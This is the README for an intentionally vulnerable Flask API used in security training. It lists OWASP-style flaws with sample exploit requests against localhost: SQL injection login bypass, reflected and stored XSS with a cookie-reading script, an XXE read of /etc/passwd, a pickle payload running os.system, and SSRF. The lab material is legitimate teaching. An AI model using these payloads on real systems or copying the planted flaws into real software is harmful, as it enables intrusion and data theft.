# Intentionally Vulnerable API

⚠️ **WARNING: This is an intentionally vulnerable application. DO NOT deploy in production or expose to the internet!** ⚠️

This is a deliberately vulnerable Flask API created for educational purposes to demonstrate common API security vulnerabilities. It implements the OWASP API Top 10 vulnerabilities and other security issues for learning and testing purposes.

## Vulnerabilities Implemented

1. **Broken Object Level Authorization (BOLA)**
   - Endpoints don't verify if the user has permission to access resources
   - Example: `/posts/<id>` allows access to any post without authorization

2. **Broken Authentication**
   - Plain text password storage
   - Weak JWT implementation
   - No password complexity requirements
   - Example exploit:
     ```bash
     curl -X POST http://localhost:5000/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "password"}'
     ```

3. **Excessive Data Exposure**
   - Sensitive data exposed through API responses
   - Example: `/users` endpoint exposes all user data including passwords
   ```bash
   curl http://localhost:5000/users
   ```

4. **Security Misconfiguration**
   - Debug mode enabled
   - Exposed error messages
   - Running on all interfaces (0.0.0.0)
   - Vulnerable dependency versions

5. **Lack of Rate Limiting**
   - No limits on API requests
   - Vulnerable to brute force attacks

6. **SQL Injection**
   - Login endpoint vulnerable to SQL injection
   - Example exploit:
     ```bash
     curl -X POST http://localhost:5000/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin\' --", "password": "anything"}'
     ```

7. **Reflected XSS**
   - Search endpoint vulnerable to XSS
   - Example: Visit `/search?q=<script>alert('XSS')</script>`

8. **Stored XSS**
   - Notes endpoint stores and renders unescaped HTML
   - Example exploit:
     ```bash
     curl -X POST http://localhost:5000/notes \
     -H "Content-Type: application/json" \
     -d '{"note": "<script>alert(document.cookie)</script>"}'
     ```

9. **XML External Entity (XXE)**
   - XML processing endpoint vulnerable to XXE
   - Example exploit:
     ```bash
     curl -X POST http://localhost:5000/process-xml \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0" encoding="ISO-8859-1"?>
         <!DOCTYPE foo [
         <!ELEMENT foo ANY >
         <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
         <foo>&xxe;</foo>'
     ```

10. **Insecure Deserialization**
    - Pickle deserialization vulnerability
    - Example exploit (Python code):
    ```python
    import pickle
    import base64
    
    class Evil:
        def __reduce__(self):
            import os
            return (os.system, ('id',))
    
    evil_pickle = base64.b64encode(pickle.dumps(Evil())).decode()
    # Send this in request body
    ```

11. **Vulnerable Dependencies**
    - Multiple outdated packages with known vulnerabilities:
      - Flask 0.12.2
      - requests 2.18.4
      - PyJWT 1.5.0
      - and more...

12. **Server-Side Request Forgery (SSRF)**
    - URL fetching endpoint without validation
    - Example: `/fetch-url?url=http://internal-server/admin`

## Setup Instructions

1. Create a virtual environment (recommended):
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

3. Run the application:
```bash
python main.py
```

The API will be available at `http://localhost:5000`

## API Endpoints

- POST `/login` - Authentication endpoint
- GET `/posts/<id>` - Retrieve posts
- GET `/users` - List all users
- GET `/search` - Search functionality
- POST `/notes` - Add notes
- GET `/notes/<user_id>` - View notes
- POST `/process-xml` - Process XML data
- POST `/deserialize` - Process serialized data
- GET `/fetch-url` - Fetch external URLs

## Educational Purpose

This application is designed for:
- Security researchers
- Penetration testers
- Security awareness training
- Learning about API security vulnerabilities

## Security Notice

🔴 **IMPORTANT: This application contains serious security vulnerabilities. It should NEVER be:**
- Deployed in a production environment
- Exposed to the internet
- Used with sensitive or real data
- Run on a machine with sensitive information

## License

This project is for educational purposes only. Use at your own risk. 